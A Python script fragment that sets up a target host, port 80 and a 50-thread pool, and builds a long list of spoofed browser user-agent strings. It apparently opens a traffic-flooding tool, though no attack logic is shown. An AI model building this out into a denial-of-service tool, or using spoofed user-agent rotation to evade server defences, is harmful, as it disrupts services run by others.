from colorama import Fore, Back, Style
from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random, re

host = None
port = 80
thr = 50

def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 FirePHP/0.3")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; es-AR; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; es-ES; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729) FirePHP/0.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 FirePHP/0.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100524 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Linux Mint/7 (Gloria) Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86; rv:1.9.1.1) Gecko/20090716 Linux Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; nl-NL; rv:1.9.0.19) Gecko/20090720 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2pre) Gecko/20090729 Ubuntu/9.04 (jaunty) Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.1) Gecko/20090722 Gentoo Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.1) Gecko/20090714 SUSE/3.5.1-1.1 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 4.0.20506)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 GTB5 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; ca; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; hu; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; uk; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; sr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729) FirePHP/0.3")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36")
    uagent.append("Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1")
    uagent.append("Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5")
    uagent.append("Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/1EA69")
    uagent.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/19.0.1047.0 Safari/535.22")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21")
    uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1041.0 Safari/535.21")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0")
    uagent.append("Mozilla/5.0 (Macintosh; AMD Mac OS X 10_8_2) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/18.6.872")
    uagent.append("Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/11.10 Chromium/18.0.1025.142 Chrome/18.0.1025.142 Safari/535.19")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/10.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.56 Chrome/17.0.963.56 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz")
    uagent.append("Mozilla/5.0 (X11; CrOS i686 1193.158.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.8")
    uagent.append("Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2")
    uagent.append("Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2")
    uagent.append("Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.04 Chromium/15.0.871.0 Chrome/15.0.871.0 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2")
    uagent.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/535.2")
    uagent.append("Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.363.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (X11; U; x86_64 Linux; en_GB, en_US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.357.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.356.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.355.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.354.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2")
    uagent.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.5 Safari/533.2")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.3 Safari/533.2")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
    uagent.append("Mozilla/5.0 (X11; U; Linux i586; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.1 Safari/533.2")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.1")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/5.0.335.0 Safari/533.16")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.308.0 Safari/532.9")
    uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9")
    uagent.append("Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
    uagent.append("Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36")
    uagent.append("Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0")
